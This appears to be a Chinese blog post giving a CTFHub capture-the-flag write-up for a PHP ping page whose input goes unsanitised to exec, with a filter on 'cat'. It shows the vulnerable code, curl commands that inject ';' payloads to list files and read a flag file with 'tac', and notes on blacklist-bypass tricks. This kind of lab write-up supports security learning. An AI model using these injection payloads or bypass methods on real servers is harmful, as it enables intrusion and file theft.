
---
layout: post
title: "CTFHub Writeup-过滤cat"
date: 2026-09-16
categories: CTF
tags: [CTFHub, Web, 技能树]
---

# CTFHub Writeup - 过滤cat

## 题目类型

WEB

## 题目描述

打开题目，点开链接后，页面出现一个大标题：CTFHub 命令注入-过滤cat

标题下面有个输入框，旁边有一个Ping按键

下面一串代码：

<?php

$res = FALSE;

if (isset($_GET['ip']) && $_GET['ip']) {
    $ip = $_GET['ip'];
    $m = [];
    if (!preg_match_all("/cat/", $ip, $m)) {
        $cmd = "ping -c 4 {$ip}";
        exec($cmd, $res);
    } else {
        $res = $m;
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>CTFHub 命令注入-过滤cat</title>
</head>
<body>

<h1>CTFHub 命令注入-过滤cat</h1>

<form action="#" method="GET">
    <label for="ip">IP : </label><br>
    <input type="text" id="ip" name="ip">
    <input type="submit" value="Ping">
</form>

<hr>

<pre>
<?php
if ($res) {
    print_r($res);
}
?>
</pre>

<?php
show_source(__FILE__);
?>

</body>
</html>

## 解题过程

通过理解题目代码，发现靶场源码通过 preg_match_all("/cat/", $ip, $m) 把 cat 这个关键词拉黑了。
既然无法直接使用 cat，我们就需要使用功能相同但不包含 cat 字符串的命令（如 tac、more、head 等）来读取 Flag 文件。

点击Win+R，搜索cmd

为验证命令寻找Flag文件，输入命令：

curl.exe -sS --get --data-urlencode "ip=127.0.0.1; pwd; ls -la" "http://challenge-14d5e7ef5c41fe9e.sandbox.ctfhub.com:10800/"

回车后页面回显一段 Array 数组，[9] 行显示 /var/www/html，[13] 行显示目标文件 flag_2503578223190.php。

因为此题无法使用cat字符串的命令，所以使用tac绕过cat过滤，输入命令：

curl.exe -sS --get --data-urlencode "ip=127.0.0.1; tac /var/www/html/flag_2503578223190.php" "http://challenge-14d5e7ef5c41fe9e.sandbox.ctfhub.com:10800/"

回车后，页面回显里直接出现 <?php // ctfhub{a1bff692f4cfc922b012c4f6}，成功拿到 Flag

## 笔记

这道题主要学习了：

1、命令注入中的黑名单绕过思路

理解了靶场源码通过 preg_match_all("/cat/", $ip, $m) 把 cat 关键字拉黑，禁止我们使用 cat 读取文件。

绕过方法不是死磕 cat，而是寻找功能相同但字符不同的替代命令，比如 tac、more、head、nl 等。
 
2、tac 命令的妙用

掌握了 tac 是 cat 的反向拼写，功能同样是读取文件内容（从最后一行倒序输出），而且不包含 cat 字符串，完美绕过黑名单。

这种“反写命令”的思维在 CTF 中非常实用。
 
3、CMD 与 curl.exe 的精准发包技巧

再次巩固了 curl.exe --get --data-urlencode "ip=127.0.0.1; 命令" 的用法。

浏览器地址栏会自动把空格、分号、单引号等字符 URL 编码，容易破坏 Payload，而 curl 配合 --data-urlencode 可以精准控制编码，确保命令原样发给服务器。
 
4、命令注入的通用排查流程

掌握了标准的解题三步走：

• 先探路：用 pwd; ls -la 确认当前目录和文件列表，找到目标文件名。

• 再绕过：根据被过滤的关键词，寻找等效替代命令。

• 最后提取：用替代命令读取目标文件内容，拿到 Flag。


 

